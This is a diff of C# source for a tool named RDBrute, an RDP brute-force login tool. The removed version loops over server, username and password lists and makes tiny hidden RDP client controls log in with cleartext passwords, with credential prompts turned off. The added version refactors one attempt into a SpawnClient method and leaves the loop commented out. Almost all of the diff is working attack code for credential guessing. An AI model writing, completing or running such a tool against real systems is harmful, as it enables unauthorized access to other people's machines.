@@ -7,82 +7,101 @@ using RDBrute;
 using AxMSTSCLib;
 using System.Windows.Forms;
 using MSTSCLib;
+using System.Threading;
 
 namespace RDBrute {
     class RDPClient {
+        //public TaskCompletionSource<bool> TheResult = new TaskCompletionSource<bool>();
 
-        public void newclient(Form f, string[] username, string[] password, string[] server, int threads) {
+        public async Task newclient(Form f, string[] username, string[] password, string[] server) {
 
-            AxMsRdpClient9NotSafeForScripting[] rdpClient = new AxMsRdpClient9NotSafeForScripting[threads];
+            //List<Task<string>> tasks = new List<Task<string>>();
+            //foreach (string thisserver in server) {
+            //    foreach (string thispassword in password) {
+            //        foreach (string thisusername in username) {
+            //            Console.WriteLine(thisusername + thispassword + thisserver);
+            //            Task<string> task = SpawnClient(f, thisusername, thispassword, thisserver);
+            //            tasks.Add(task);
+            //            Console.WriteLine(tasks);
+            //        }
+            //    }
+            //}
+            //var allResults = await Task.WhenAll(tasks);
 
-            for (int i = 0; i < threads; i++) {
-                rdpClient[i] = new AxMsRdpClient9NotSafeForScripting();
-            }
+            //int maxServers = server.Count();
+            //int maxPassword = password.Count();
+            //int maxUsername = username.Count();
+            //int currentUsername = 
 
-            for (int servernumber = 0; servernumber < server.Count(); servernumber++)
-            {
-                for (int usernamenumber = 0; usernamenumber < username.Count(); usernamenumber++)
-                {
-                    for (int passwordnumber = 0; passwordnumber < password.Count(); passwordnumber++)
-                    {
-                        foreach (AxMsRdpClient9NotSafeForScripting client in rdpClient)
-                        {
-                            f.Controls.Add(client);
-                            client.Size = new System.Drawing.Size(1, 1);
-                            client.CreateControl();
-                            if (client.Connected == 1)
-                            {
-                                client.Disconnect();
-                            }
-                            client.OnConnected += Rdp_OnConnected;
-                            client.OnLoginComplete += Rdp_OnLoginComplete;
-                            client.OnLogonError += new AxMSTSCLib.IMsTscAxEvents_OnLogonErrorEventHandler(Rdp_OnLogonError);
-                            client.UserName = username[usernamenumber];
-                            client.Server = server[servernumber];
-                            
-                            ((MSTSCLib.IMsRdpClientAdvancedSettings)client.AdvancedSettings).ClearTextPassword = password[passwordnumber];
-                            ((MSTSCLib.IMsRdpClientAdvancedSettings8)client.AdvancedSettings8).EnableCredSspSupport = true;
-                            var stuff = client.GetOcx() as IMsRdpClientNonScriptable7;
-                            stuff.PromptForCredentials = false;
+            //for (int maxServers = 1; maxServers < server.Count(); maxServers++) {
 
-                            client.Connect();
+            //}
 
-                            //Console.WriteLine(username[usernamenumber]);
-                            //Console.WriteLine(password[passwordnumber]);
-                            //Console.WriteLine(server[servernumber]);
-                        }
-                    }
-                }
-            }
+            //for(int serverNumber = 1; serverNumber < server.Count(); serverNumber++) {
+            //    for (int passwordNumber = 1; passwordNumber < password.Count(); passwordNumber++) {
+            //        for (int usernameNumber = 1; serverNumber < username.Count(); usernameNumber++) {
 
-            //AxMsRdpClient9NotSafeForScripting rdpClient = new AxMsRdpClient9NotSafeForScripting();
-            //f.Controls.Add(rdpClient);
-            //rdpClient.CreateControl();
-            //rdpClient.OnConnected += Rdp_OnConnected;
-            //rdpClient.OnLoginComplete += Rdp_OnLoginComplete;
-            //rdpClient.OnLogonError += new AxMSTSCLib.IMsTscAxEvents_OnLogonErrorEventHandler(Rdp_OnLogonError);
-            //rdpClient.UserName = username;
-            //rdpClient.Server = server;
-            //((MSTSCLib.IMsRdpClientAdvancedSettings)rdpClient.AdvancedSettings).ClearTextPassword = password;
-            //((MSTSCLib.IMsRdpClientAdvancedSettings8)rdpClient.AdvancedSettings8).EnableCredSspSupport = true;
-            //var stuff = rdpClient.GetOcx() as IMsRdpClientNonScriptable7;
-            //stuff.PromptForCredentials = false;
+            //            string nextserver = server[serverNumber];
+            //            string nextpassword = password[passwordNumber];
+            //            string nextusername = username[usernameNumber];
 
-            //rdpClient.Connect();
-            //Console.Write(rdpClient);
+            //            Console.WriteLine(server[serverNumber]);
+
+            //            Task<string> Task = SpawnClient(f, nextusername, nextpassword, nextserver);
+
+
+
+            //        }
+            //    }
+            //}
+
+        }
+
+        public async Task<string> SpawnClient(Form f, string nextusername, string nextpassword, string nextserver) {
+            
+
+            AxMsRdpClient9NotSafeForScripting rdpClient = new AxMsRdpClient9NotSafeForScripting();
+            f.Controls.Add(rdpClient);
+            rdpClient.Size = new System.Drawing.Size(1, 1);
+            rdpClient.CreateControl();
+            rdpClient.OnConnected += Rdp_OnConnected;
+            rdpClient.OnLoginComplete += Rdp_OnLoginComplete;
+            rdpClient.OnLogonError += new AxMSTSCLib.IMsTscAxEvents_OnLogonErrorEventHandler(Rdp_OnLogonError);
+            rdpClient.UserName = nextusername;
+            rdpClient.Server = nextserver;
+            ((MSTSCLib.IMsRdpClientAdvancedSettings)rdpClient.AdvancedSettings).ClearTextPassword = nextpassword;
+            ((MSTSCLib.IMsRdpClientAdvancedSettings8)rdpClient.AdvancedSettings8).EnableCredSspSupport = true;
+            var stuff = rdpClient.GetOcx() as IMsRdpClientNonScriptable7;
+            stuff.PromptForCredentials = false;
+            //stuff.PromptForCredsOnClient = false;
+
+            rdpClient.Connect();
+            
+            //TheResult.Delay(5000);
+
+            return "";
+            //Console.WriteLine(nextserver + " done");
+          
+        }
+
+        public void getResult(string result) {
+            //public static string result;
+        
         }
 
         public void Rdp_OnConnected(object sender, EventArgs e) {
             MessageBox.Show("Connected");
+            //getResult("connected");            
         }
 
         public void Rdp_OnLoginComplete(object sender, EventArgs e) {
-            MessageBox.Show("LoggedIn");
+            MessageBox.Show("Logged in");
+            //getResult("success");
         }
 
         public void Rdp_OnLogonError(object sender, IMsTscAxEvents_OnLogonErrorEvent e) {
-            MessageBox.Show("Failed");
-            Console.WriteLine("failed");
+            MessageBox.Show("Error");
+            //getResult("error");
         }
 
     }
